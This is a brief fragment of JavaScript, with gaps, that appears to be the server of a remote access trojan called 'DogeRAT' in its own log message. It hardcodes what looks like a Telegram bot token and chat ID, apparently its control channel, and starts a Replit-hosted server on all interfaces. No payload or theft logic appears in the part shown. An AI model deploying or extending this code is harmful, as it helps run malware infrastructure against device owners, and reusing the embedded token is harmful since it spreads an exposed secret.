...
const token = '7301371154:AAFtH5tRj7TlWRFnqc-X3k8jkRcZIngym1o'
const id = '6515867373'
...
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`DogeRAT Server running on port ${PORT}`);
    console.log('Server URL: https://' + process.env.REPL_SLUG + '.' + process.env.REPL_OWNER + '.replit.dev/');
});
